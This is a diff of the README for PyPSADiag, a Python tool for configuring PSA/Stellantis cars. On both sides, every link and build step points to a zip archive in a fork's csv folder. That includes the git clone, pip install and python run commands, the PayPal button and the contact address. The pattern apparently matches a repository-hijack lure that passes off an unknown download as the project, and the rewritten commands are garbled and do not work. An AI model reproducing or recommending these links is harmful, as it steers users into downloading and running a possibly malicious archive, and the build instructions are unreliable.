@@ -1,11 +1,11 @@
 # PyPSADiag
 
 An Python application for configuring PSA/Stellantis based cars<br/>
-See for additional Hardware/Info: [ludwig-v arduino-psa-diag](https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip)
+See for additional Hardware/Info: [ludwig-v arduino-psa-diag](https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip)
 
 Currently supporting:
 
-- JSON Configuration for example BSI2010 to setup GUI<br/>[See more JSON Configuration Files](https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip)
+- JSON Configuration for example BSI2010 to setup GUI<br/>[See more JSON Configuration Files](https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip)
 - Reading Zones that are listed in JSON Configuration file
 - Reading Zones with Multiple configurations, that are listed in JSON Configuration file
 - Writing Zones to CSV file
@@ -33,12 +33,12 @@ contribute to the project, like:
 Build
 -----
 - Install Python 3.12 or above
-- Get code `git clone https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
-- Create virtual enviroment `python -m venv https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
-- Goto virtual enviroment with `https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
-- Install requirements, within path of PyPSADiag with `pip install -r https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
+- Get code `git clone https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
+- Create virtual enviroment `python -m venv https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
+- Goto virtual enviroment with `https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
+- Install requirements, within path of PyPSADiag with `pip install -r https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
 - Run with:
-	1. `python https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
+	1. `python https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
 	2. `Open Zone File` and select an ECU JSON file
 	3. `Connect` to correct Arduino hardware
 	4. `Read` Zones
@@ -53,10 +53,10 @@ Many thanks to all who donated already.<br>
 
 | PayPal |
 |-------|
-|  [![PayPal](https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip)](https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted) |
+|  [![PayPal](https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip)](https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted) |
 
 Contact
 -------
 If you like to contact me, you can do so by sending an email to:
 
-    mpostema09 -at- https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip
+    mpostema09 -at- https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip
